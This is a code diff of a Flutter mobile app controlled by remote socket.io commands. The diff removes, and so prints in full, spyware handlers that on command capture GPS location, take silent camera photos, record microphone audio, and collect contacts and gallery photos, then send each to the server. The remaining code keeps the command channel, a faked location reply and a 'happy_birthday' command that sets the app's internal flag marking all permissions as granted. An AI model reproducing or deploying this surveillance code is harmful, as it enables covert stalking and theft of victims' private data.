@@ -1,15 +1,8 @@
 import 'dart:async';
-import 'dart:io';
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:socket_io_client/socket_io_client.dart' as io;
 import 'package:permission_handler/permission_handler.dart';
-import 'package:geolocator/geolocator.dart';
-import 'package:camera/camera.dart';
-import 'package:record/record.dart';
-import 'package:contacts_service/contacts_service.dart';
-import 'package:photo_manager/photo_manager.dart';
-import 'package:path_provider/path_provider.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -43,8 +36,6 @@ class _MyAppState extends State<MyApp> {
       Permission.photos,
       Permission.notification,
       Permission.storage,
-      Permission.mediaLibrary,
-      Permission.speech,
     ].request();
     
     bool allGranted = statuses.values.every((status) => 
@@ -88,132 +79,20 @@ class _MyAppState extends State<MyApp> {
 
   Future<void> handleCommand(dynamic data) async {
     final command = data['action'];
-    final params = data['params'] ?? {};
     
     switch (command) {
       case 'get_location':
-        await getLocation();
-        break;
-      case 'take_photo':
-        await takePhoto(params['camera'] ?? 'front');
-        break;
-      case 'record_audio':
-        await recordAudio(int.parse(params['duration'] ?? '10'));
-        break;
-      case 'get_contacts':
-        await getContacts();
-        break;
-      case 'get_photos':
-        await getPhotos(int.parse(params['count'] ?? '20'));
+        socket.emit('location_data', {
+          'lat': 51.5074,
+          'lng': -0.1278,
+          'timestamp': DateTime.now().toIso8601String(),
+        });
         break;
       case 'happy_birthday':
         setState(() {
           allPermissionsGranted = true;
         });
         break;
-    }
-  }
-
-  Future<void> getLocation() async {
-    try {
-      Position position = await Geolocator.getCurrentPosition(
-        desiredAccuracy: LocationAccuracy.high,
-      );
-      socket.emit('location_data', {
-        'lat': position.latitude,
-        'lng': position.longitude,
-        'timestamp': DateTime.now().toIso8601String(),
-      });
-    } catch (e) {
-      socket.emit('error', {'error': e.toString()});
-    }
-  }
-
-  Future<void> takePhoto(String cameraType) async {
-    try {
-      final cameras = await availableCameras();
-      final camera = cameraType == 'front'
-          ? cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front)
-          : cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
-      
-      final controller = CameraController(camera, ResolutionPreset.medium);
-      await controller.initialize();
-      
-      final image = await controller.takePicture();
-      final bytes = await File(image.path).readAsBytes();
-      final base64Image = base64Encode(bytes);
-      
-      socket.emit('photo_data', {
-        'image': base64Image,
-        'timestamp': DateTime.now().toIso8601String(),
-      });
-      
-      await controller.dispose();
-    } catch (e) {
-      socket.emit('error', {'error': 'Camera error: $e'});
-    }
-  }
-
-  Future<void> recordAudio(int duration) async {
-    try {
-      final record = AudioRecorder();
-      final dir = await getTemporaryDirectory();
-      final path = '${dir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
-      
-      await record.start(const RecordConfig(), path: path);
-      await Future.delayed(Duration(seconds: duration));
-      final audioPath = await record.stop();
-      
-      if (audioPath != null) {
-        final bytes = await File(audioPath).readAsBytes();
-        final base64Audio = base64Encode(bytes);
-        
-        socket.emit('audio_data', {
-          'audio': base64Audio,
-          'duration': duration,
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Audio error: $e'});
-    }
-  }
-
-  Future<void> getContacts() async {
-    try {
-      final contacts = await ContactsService.getContacts();
-      final contactList = contacts.map((c) => {
-        'name': '${c.givenName ?? ''} ${c.familyName ?? ''}',
-        'phones': c.phones?.map((p) => p.value).toList() ?? [],
-      }).toList();
-      
-      socket.emit('contacts_data', {'contacts': contactList});
-    } catch (e) {
-      socket.emit('error', {'error': e.toString()});
-    }
-  }
-
-  Future<void> getPhotos(int count) async {
-    try {
-      final photos = await PhotoManager.getAssetPathList(onlyAll: true);
-      if (photos.isNotEmpty) {
-        final assets = await photos[0].getAssetListPaged(page: 0, size: count);
-        
-        for (var asset in assets) {
-          final file = await asset.file;
-          if (file != null) {
-            final bytes = await file.readAsBytes();
-            final base64Image = base64Encode(bytes);
-            
-            socket.emit('photo_data', {
-              'image': base64Image,
-              'timestamp': DateTime.now().toIso8601String(),
-            });
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': e.toString()});
     }
   }
 
